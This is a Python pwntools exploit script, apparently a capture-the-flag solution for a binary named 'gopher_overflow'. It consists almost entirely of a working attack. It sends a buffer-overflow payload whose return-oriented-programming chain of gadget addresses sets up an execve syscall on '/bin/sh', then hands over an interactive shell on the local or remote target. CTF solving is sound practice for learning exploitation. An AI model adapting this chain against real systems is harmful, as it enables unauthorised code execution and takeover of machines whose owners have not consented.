#!/usr/bin/env python3

# type: ignore
# flake8: noqa

from pwn import *

elf = context.binary = ELF("./gopher_overflow", checksec=False)


def start(argv=[], *a, **kw):
    nc = "nc challenge.ctf.games 31317"
    nc = nc.split()
    host = args.HOST or nc[1]
    port = int(args.PORT or nc[2])
    if args.REMOTE:
        return remote(host, port)
    else:
        return process([elf.path] + argv, env=env, *a, **kw)


env = {}
io = start()

ret = 0x00401032
mov_rdi_rbx = 0x0044a7ff  # mov rdi, rbx; add rsp, 0x18; pop rbp; ret;
pop_rbx = 0x00404aa1
pop_rdx = 0x0047a67a
pop_rcx = 0x0047572c  # pop rcx; sbb [rax+0x29], cl; ret;
pop_rax_rbp = 0x0047cdb3
mov_rsi_rcx = 0x004115c9  # mov rsi, rcx; add rsp, 0x10; pop rbp; ret;
mov_rax_r8 = 0x004093fb
mov_rcx_r10 = 0x00411550  # mov rcx, r10; mov rdi, rsi; add rsp, 0x10; pop rbp; ret;
add_rcx_rbx = 0x0042c5e4  # add rcx, rbx; sub rdx, rcx; mov [rax+0x48], rdx; ret;  # noqa
mov_rdi_rsi = mov_rcx_r10 + 3
syscall = 0x0045e5e9

writable = elf.bss(0xc00)
main_main = 0x47cd00

# when debugging, our /bin/sh may be garbage collected before we reach the
# syscall gadget
payload = b""
payload += p64(writable) * 5  # obtained from debugging to avoid error
payload += p64(0)  # obtained from debugging to avoid error
payload += b"/bin/sh\x00" * 8
payload += p64(writable) * 8  # obtained from debugging to avoid error
payload = payload.ljust(180, b"A")  # obtained from debugging to avoid error
payload = payload.ljust(240, b"\x00")  # obtained from debugging to avoid error
payload += flat(
    mov_rcx_r10, 0, 0, writable,
    ret, ret, ret, ret,
    pop_rbx, 0x68,  # anywhere from 0x30 to 0x68
    pop_rax_rbp, writable, writable,
    add_rcx_rbx,
    mov_rsi_rcx, 0, 0, writable,
    mov_rdi_rsi, 0, 0, writable,
    pop_rcx, 0,
    mov_rsi_rcx, 0, 0, writable,
    pop_rdx, 0,
    pop_rax_rbp, 0x3b, writable,
    syscall,
)

io.send(payload)

io.interactive()
